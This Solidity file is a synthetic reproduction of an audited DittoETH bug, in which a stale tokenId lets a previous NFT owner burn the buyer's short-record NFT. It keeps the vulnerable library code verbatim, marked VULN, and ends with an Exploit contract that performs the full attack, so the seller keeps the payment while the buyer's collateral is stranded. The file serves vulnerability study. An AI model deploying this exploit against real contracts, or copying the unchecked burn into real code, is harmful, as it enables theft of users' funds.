// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  DittoETH — previous NFT owner can burn the NFT from the new owner
    (CodeHawks 2023-09-ditto, reporter hash, AuditVault #27455).

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: LibShortRecord.deleteShortRecord marks a transferred short
    Cancelled but never resets tokenId. A later fill of the still-open partial
    revives that short (SR.Cancelled -> FullyFilled) with the sold tokenId still
    set. ShortRecordFacet.combineShorts then burns whatever tokenId is stored on
    the caller's short. burnNFT deletes nftMapping[tokenId] with no check that
    msg.sender is the current owner, so the buyer's NFT is burned.

    Audited bodies preserved verbatim (@> VULN on the burn):
      LibShortRecord.transferShortRecord / deleteShortRecord / burnNFT
      ShortRecordFacet.combineShorts tokenId burn
      LibShortRecord.fillShortRecord cancelled-record revival
    Repo: Cyfrin/2023-09-ditto @ a93b4276420a092913f43169a353a6198d3c21b9 */

address constant ASSET = address(0xA55E);
uint88 constant COLLATERAL = 2 ether;
uint88 constant DEBT = 1 ether;
uint256 constant PRICE = 1 ether;
uint8 constant HEAD = 1;
uint8 constant SHORT_MAX_ID = 254;
uint8 constant SHORT_STARTING_ID = 2;

enum SR {
    PartialFill,
    FullyFilled,
    Cancelled
}

struct ShortRecord {
    uint88 collateral;
    uint88 ercDebt;
    SR status;
    uint8 prevId;
    uint8 id;
    uint8 nextId;
    uint80 zethYieldRate;
    uint64 ercDebtRate;
    uint40 tokenId;
    uint24 flaggerId;
    uint24 updatedAt;
}

struct NFT {
    address owner;
    uint8 assetId;
    uint8 shortRecordId;
}

struct AppStorage {
    uint40 tokenIdCounter;
    mapping(address asset => mapping(address shorter => mapping(uint8 id => ShortRecord))) shortRecords;
    mapping(address asset => mapping(address shorter => uint8)) nextShortId;
    mapping(uint256 tokenId => NFT) nftMapping;
    mapping(uint256 tokenId => address) getApproved;
    mapping(address owner => mapping(address operator => bool)) isApprovedForAll;
    mapping(uint8 assetId => address) assetMapping;
    mapping(address asset => uint8) assetIds;
}

function appStorage() pure returns (AppStorage storage s) {
    assembly {
        s.slot := 0
    }
}

library Errors {
    error FirstShortMustBeNFT();
    error NotMinted();
    error OriginalShortRecordCancelled();
    error CannotTransferFlaggedShort();
    error ReceiverExceededShortRecordLimit();
    error InvalidShortId();
    error AlreadyMinted();
    error InvalidTokenId();
    error ERC721IncorrectOwner();
    error ERC721InvalidReceiver();
    error ERC721InsufficientApproval();
    error ERC721NonexistentToken(uint256 tokenId);
}

library LibShortRecord {
    event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);

    // Audited LibShortRecord.burnNFT. Deletes the NFT of whoever currently owns
    // tokenId. There is no msg.sender == nft.owner check.
    function burnNFT(uint256 tokenId) internal {
        //@dev No need to check downcast tokenId because it is handled in function that calls burnNFT
        AppStorage storage s = appStorage();
        NFT storage nft = s.nftMapping[tokenId];
        if (nft.owner == address(0)) revert Errors.NotMinted();
        address asset = s.assetMapping[nft.assetId];
        ShortRecord storage short = s.shortRecords[asset][nft.owner][nft.shortRecordId];
        delete s.nftMapping[tokenId];
        delete s.getApproved[tokenId];
        delete short.tokenId;
        emit Transfer(nft.owner, address(0), tokenId);
    }
}

/// dUSD the buyer pays for the short NFT. 18 decimals, 1 ether unit = 1 dUSD.
contract PaymentToken {
    string public name = "Ditto USD";
    string public symbol = "dUSD";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// Buyer. Pays PRICE, holds the NFT, and can release collateral only while ownerOf matches.
contract EscrowBuyer {
    PaymentToken public immutable pay;
    ShortRecordNFT public immutable market;
    uint256 public tokenId;
    uint256 public spent;

    constructor(PaymentToken _pay, ShortRecordNFT _market) {
        pay = _pay;
        market = _market;
    }

    function fundAndPay(address seller, uint256 price) external {
        pay.transfer(seller, price);
        spent = price;
    }

    function noteToken(uint256 id) external {
        tokenId = id;
    }

    function canClaim() external view returns (bool) {
        if (tokenId == 0) return false;
        try market.ownerOf(tokenId) returns (address o) {
            return o == address(this);
        } catch {
            return false;
        }
    }

    function claim() external returns (uint88) {
        require(market.ownerOf(tokenId) == address(this), "escrow lost the nft");
        return market.releaseCollateral(tokenId);
    }
}

/// Reduced Ditto short-record NFT. No Solidity state variables: storage is the
/// diamond AppStorage at slot 0, matching LibShortRecord.appStorage().
contract ShortRecordNFT {
    constructor() {
        AppStorage storage s = appStorage();
        s.tokenIdCounter = 1;
        s.assetIds[ASSET] = 1;
        s.assetMapping[1] = ASSET;
    }

    function assetAddr() external pure returns (address) {
        return ASSET;
    }

    function collateralAmount() external pure returns (uint88) {
        return COLLATERAL;
    }

    function price() external pure returns (uint256) {
        return PRICE;
    }

    function nftOwner(uint256 tokenId) external view returns (address) {
        return appStorage().nftMapping[tokenId].owner;
    }

    function ownerOf(uint256 tokenId) public view returns (address) {
        address owner = appStorage().nftMapping[tokenId].owner;
        if (owner == address(0)) revert Errors.ERC721NonexistentToken(tokenId);
        return owner;
    }

    function shortRecordIdOf(uint256 tokenId) external view returns (uint8) {
        return appStorage().nftMapping[tokenId].shortRecordId;
    }

    function tokenIdOf(address asset, address shorter, uint8 id) external view returns (uint40) {
        return appStorage().shortRecords[asset][shorter][id].tokenId;
    }

    function collateralOf(address asset, address shorter, uint8 id) external view returns (uint88) {
        return appStorage().shortRecords[asset][shorter][id].collateral;
    }

    function statusOf(address asset, address shorter, uint8 id) external view returns (SR) {
        return appStorage().shortRecords[asset][shorter][id].status;
    }

    function openPartialShort(address asset, uint88 collateral, uint88 ercDebt) external returns (uint8 id) {
        id = _createShortRecord(asset, msg.sender, SR.PartialFill, collateral, ercDebt, 0, 0, 0);
    }

    function openFilledShort(address asset, uint88 collateral, uint88 ercDebt) external returns (uint8 id) {
        id = _createShortRecord(asset, msg.sender, SR.FullyFilled, collateral, ercDebt, 0, 0, 0);
    }

    function mintNFT(address asset, uint8 shortRecordId) external returns (uint256 minted) {
        AppStorage storage s = appStorage();
        ShortRecord storage short = s.shortRecords[asset][msg.sender][shortRecordId];
        if (short.status == SR.Cancelled) revert Errors.InvalidShortId();
        if (short.tokenId != 0) revert Errors.AlreadyMinted();

        s.nftMapping[s.tokenIdCounter] = NFT({
            owner: msg.sender,
            assetId: s.assetIds[asset],
            shortRecordId: shortRecordId
        });
        short.tokenId = s.tokenIdCounter;
        minted = s.tokenIdCounter;
        //@dev never decreases
        s.tokenIdCounter += 1;
    }

    function transferFrom(address from, address to, uint256 tokenId) public {
        if (tokenId > type(uint40).max) revert Errors.InvalidTokenId();
        AppStorage storage s = appStorage();
        if (msg.sender != from && !s.isApprovedForAll[from][msg.sender] && msg.sender != s.getApproved[tokenId]) {
            revert Errors.ERC721InsufficientApproval();
        }
        address owner = ownerOf(tokenId);
        if (owner != from) revert Errors.ERC721IncorrectOwner();
        if (to == address(0)) revert Errors.ERC721InvalidReceiver();

        NFT memory nft = s.nftMapping[tokenId];
        address asset = s.assetMapping[nft.assetId];
        _transferShortRecord(asset, from, to, uint40(tokenId), nft);
        emit LibShortRecord.Transfer(from, to, tokenId);
    }

    /// Audited transferShortRecord. Deletes the sender's short, recreates it for
    /// `to`, and repoints the NFT. The deleted record keeps its tokenId.
    function _transferShortRecord(address asset, address from, address to, uint40 tokenId, NFT memory nft) internal {
        AppStorage storage s = appStorage();
        ShortRecord storage short = s.shortRecords[asset][from][nft.shortRecordId];
        if (short.status == SR.Cancelled) revert Errors.OriginalShortRecordCancelled();
        if (short.flaggerId != 0) revert Errors.CannotTransferFlaggedShort();

        deleteShortRecord(asset, from, nft.shortRecordId);

        uint8 id = _createShortRecord(
            asset, to, SR.FullyFilled, short.collateral, short.ercDebt, short.ercDebtRate, short.zethYieldRate, tokenId
        );
        if (id == SHORT_MAX_ID) revert Errors.ReceiverExceededShortRecordLimit();

        s.nftMapping[tokenId].owner = to;
        s.nftMapping[tokenId].shortRecordId = id;
    }

    /// Audited deleteShortRecord. PartialFill skips the unlink. tokenId is never written.
    function deleteShortRecord(address asset, address shorter, uint8 id) internal virtual {
        AppStorage storage s = appStorage();
        ShortRecord storage shortRecord = s.shortRecords[asset][shorter][id];
        // Because of the onlyValidShortRecord modifier, only cancelShort can pass SR.Cancelled
        // Don't recycle shortRecord id 254 so it can be used for all overflow uint8 ids
        if (shortRecord.status != SR.PartialFill && id < SHORT_MAX_ID) {
            // remove the links of ID in the market
            s.shortRecords[asset][shorter][shortRecord.prevId].nextId = shortRecord.nextId;
            if (shortRecord.nextId != HEAD) {
                s.shortRecords[asset][shorter][shortRecord.nextId].prevId = shortRecord.prevId;
            }
        }

        // FIX: shortRecord.tokenId = 0;
        shortRecord.status = SR.Cancelled;
    }

    /// Audited fillShortRecord revival. A Cancelled partial is zeroed and marked
    /// live again. tokenId is not a parameter and is not stored.
    function fillRemaining(address asset, uint8 id, uint88 collateral, uint88 ercAmount) external {
        _fillShortRecord(asset, msg.sender, id, SR.FullyFilled, collateral, ercAmount);
    }

    function _fillShortRecord(
        address asset,
        address shorter,
        uint8 shortId,
        SR status,
        uint88 collateral,
        uint88 ercAmount
    ) internal {
        AppStorage storage s = appStorage();
        ShortRecord storage short = s.shortRecords[asset][shorter][shortId];
        if (short.status == SR.Cancelled) {
            short.ercDebt = short.collateral = 0;
        }

        short.status = status;
        short.collateral += collateral;
        short.ercDebt += ercAmount;
    }

    /// Audited combineShorts burn. Two ids: the keeper NFT is id1, the stale one is id2.
    function combineShorts(address asset, uint8 id1, uint8 id2) external {
        _onlyValidShortRecord(asset, msg.sender, id1);
        _onlyValidShortRecord(asset, msg.sender, id2);
        AppStorage storage s = appStorage();
        ShortRecord storage firstShort = s.shortRecords[asset][msg.sender][id1];
        ShortRecord storage currentShort = s.shortRecords[asset][msg.sender][id2];

        if (currentShort.tokenId != 0) {
            //@dev First short needs to have NFT so there isn't a need to burn and re-mint
            if (firstShort.tokenId == 0) {
                revert Errors.FirstShortMustBeNFT();
            }

            // @> VULN: stale tokenId burns the new owner's NFT — no check that msg.sender owns it
            LibShortRecord.burnNFT(currentShort.tokenId);
        }

        firstShort.collateral += currentShort.collateral;
        firstShort.ercDebt += currentShort.ercDebt;
        deleteShortRecord(asset, msg.sender, id2);
    }

    /// Control entry. Reverts once tokenId was cleared, so the previous owner cannot burn.
    function burnShortNft(address asset, uint8 id) external {
        AppStorage storage s = appStorage();
        ShortRecord storage currentShort = s.shortRecords[asset][msg.sender][id];
        if (currentShort.tokenId == 0) revert Errors.NotMinted();
        LibShortRecord.burnNFT(currentShort.tokenId);
    }

    function releaseCollateral(uint256 tokenId) external returns (uint88 amount) {
        address owner = ownerOf(tokenId);
        if (msg.sender != owner) revert Errors.ERC721IncorrectOwner();
        AppStorage storage s = appStorage();
        NFT storage nft = s.nftMapping[tokenId];
        address asset = s.assetMapping[nft.assetId];
        ShortRecord storage short = s.shortRecords[asset][owner][nft.shortRecordId];
        amount = short.collateral;
        short.collateral = 0;
    }

    function _onlyValidShortRecord(address asset, address shorter, uint8 id) internal view {
        AppStorage storage s = appStorage();
        if (id < SHORT_STARTING_ID) revert Errors.InvalidShortId();
        if (s.shortRecords[asset][shorter][id].status == SR.Cancelled) revert Errors.InvalidShortId();
    }

    function _createShortRecord(
        address asset,
        address shorter,
        SR status,
        uint88 collateral,
        uint88 ercAmount,
        uint64 ercDebtRate,
        uint80 zethYieldRate,
        uint40 tokenId
    ) internal returns (uint8 id) {
        AppStorage storage s = appStorage();
        uint8 cursor = s.nextShortId[asset][shorter];
        if (cursor == 0) cursor = SHORT_STARTING_ID;
        id = cursor;
        if (id == SHORT_MAX_ID) return id;
        s.nextShortId[asset][shorter] = cursor + 1;
        s.shortRecords[asset][shorter][id] = ShortRecord({
            collateral: collateral,
            ercDebt: ercAmount,
            status: status,
            prevId: 0,
            id: id,
            nextId: 0,
            zethYieldRate: zethYieldRate,
            ercDebtRate: ercDebtRate,
            tokenId: tokenId,
            flaggerId: 0,
            updatedAt: 0
        });
    }
}

contract Exploit {
    PaymentToken public pay;
    ShortRecordNFT public market;
    EscrowBuyer public buyer;

    uint8 public staleShortId;
    uint8 public secondShortId;
    uint8 public buyerShortId;
    uint256 public soldTokenId;
    address public ownerBeforeBurn;
    address public ownerAfterBurn;
    uint40 public staleTokenStillSet;
    uint88 public stranded;
    uint256 public paymentKept;

    constructor() {
        pay = new PaymentToken(); // nonce 1
        market = new ShortRecordNFT(); // nonce 2
        buyer = new EscrowBuyer(pay, market); // nonce 3
    }

    function run() external {
        staleShortId = market.openPartialShort(ASSET, COLLATERAL, DEBT);
        soldTokenId = market.mintNFT(ASSET, staleShortId);
        require(market.ownerOf(soldTokenId) == address(this), "seller does not own the nft");

        pay.mint(address(buyer), PRICE);
        buyer.fundAndPay(address(this), PRICE);
        require(pay.balanceOf(address(this)) == PRICE, "buyer did not pay");

        market.transferFrom(address(this), address(buyer), soldTokenId);
        buyer.noteToken(soldTokenId);
        ownerBeforeBurn = market.ownerOf(soldTokenId);
        require(ownerBeforeBurn == address(buyer), "buyer did not receive the nft");
        buyerShortId = market.shortRecordIdOf(soldTokenId);

        market.fillRemaining(ASSET, staleShortId, COLLATERAL, DEBT);
        staleTokenStillSet = market.tokenIdOf(ASSET, address(this), staleShortId);
        require(staleTokenStillSet == uint40(soldTokenId), "revived short lost the sold tokenId");

        secondShortId = market.openFilledShort(ASSET, 1 ether, 1 ether);
        market.mintNFT(ASSET, secondShortId);
        market.combineShorts(ASSET, secondShortId, staleShortId);

        ownerAfterBurn = market.nftOwner(soldTokenId);
        stranded = market.collateralOf(ASSET, address(buyer), buyerShortId);
        paymentKept = pay.balanceOf(address(this));
        bool claimable = buyer.canClaim();
        require(ownerAfterBurn == address(0), "nft was not burned");
        require(paymentKept == PRICE, "seller did not keep the payment");
        require(stranded == COLLATERAL, "collateral not stranded on the buyer short");
        require(pay.balanceOf(address(buyer)) == 0, "buyer was refunded");
        require(!claimable, "buyer can still redeem the burned nft");
    }
}
